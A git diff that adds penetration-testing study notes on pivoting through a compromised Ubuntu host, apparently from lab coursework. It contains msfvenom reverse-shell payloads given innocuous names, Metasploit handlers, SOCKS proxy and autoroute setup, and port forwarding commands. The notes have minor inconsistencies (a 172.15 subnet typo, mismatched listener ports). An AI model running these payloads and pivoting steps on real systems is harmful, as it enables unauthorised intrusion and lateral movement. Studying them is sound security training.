@@ -221,12 +221,166 @@ ssh -R <InternalIPofPivotHost>:[listening port on internal host]:0.0.0.0:[target
 
 ------------------
 
-### Meterprreter tnnelling and port forwarding
+### Meterprreter tunnelling and port forwarding
 
 ------------------
 
+- Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.
+- Generate a linux reverse shell binary-:
 
-------------------
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] -f elf -o backupjob LPORT=8080
+```
+- Set a bash reverse shell on msfconsole-:
+
+```bash
+use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 8080
+set payload linux/x64/meterpreter/reverse_tcp
+run
+```
+
+![image](https://github.com/user-attachments/assets/b6d3ec1d-9ca2-461a-92db-8b55387603ee)
+
+- Shell
+
+![image](https://github.com/user-attachments/assets/9b50907e-6f9f-4082-9205-bd1ac9137aa8)
+
+- Set the shell to background with `background`
+
+----------------
+
+### Ping sweep on Windows Host
+
+----------------
+
+- We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
+
+```msfconsole
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+![image](https://github.com/user-attachments/assets/83dac346-649e-4515-b3f9-7e6eab0a230a)
+
+- Ping sweep with Linux-:
+
+```bash
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+- CMD-:
+```cmd
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+-  Powershell-:
+
+```powershell
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+```
+
+- There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
+- Configuring the SOCKS4 proxy-:
+
+```msfconsole
+use auxiliary/server/socks_proxy
+set SRVPORT 9050
+set SRVHOST 0.0.0.0
+set version 4a
+run
+```
+![image](https://github.com/user-attachments/assets/b09a0765-cc4f-4c0e-a958-b04ee668ab6f)
+
+- Check if it is running with `jobs`-:
+
+![image](https://github.com/user-attachments/assets/859bbf9b-9477-41b4-9a37-d2cc9d3f86b2)
+
+- Configure proxychains later[/etc/proxychains.conf]-:
+
+```conf
+socks4 	127.0.0.1 9050
+```
+- Use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.-:
+
+```msfconsole
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 172.16.5.0
+run
+```
+
+![image](https://github.com/user-attachments/assets/a21f4247-7398-4bd0-99dc-19c6b8da410b)
+
+- You can also autoroute by using the command below.
+
+```
+run autoroute -s 172.16.5.0/23
+```
+
+![image](https://github.com/user-attachments/assets/44d572ae-f22a-48e1-83dc-f1ce963349eb)
+
+- List active routes with
+
+```msfconsole
+run autoroute -p
+```
+
+- Testing the functionality-:
+
+```bash
+proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+```
+![image](https://github.com/user-attachments/assets/40593f05-9cff-4fa2-974d-22f4daa9b596)
+
+---------------
+
+### Port forwarding with metasploit
+
+---------------
+
+- Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
+- Create a local tcp portforward with portfwd-:
+
+```bash
+portfwd add -l <attacker's port> -p <remote port> -r <remote host>
+```
+
+![image](https://github.com/user-attachments/assets/d608b6f8-de7d-4f20-87d2-65758018e8a2)
+
+- Connect with xfreerdp-:
+
+![image](https://github.com/user-attachments/assets/5175d90a-fee6-4398-863d-f75240219a02)
+
+-----------------
+
+### Meterpreter Reverse Port Forwarding
+
+-----------------
+
+- Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.
+- We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
+- Syntax-:
+
+```bash
+portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+```
+-  Generate a windows/reverse_tcp  payload-:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
+- Set a windows msf reverse shell-:
+
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 8080
+run
+```
+
+-----------------
+
 
 
 
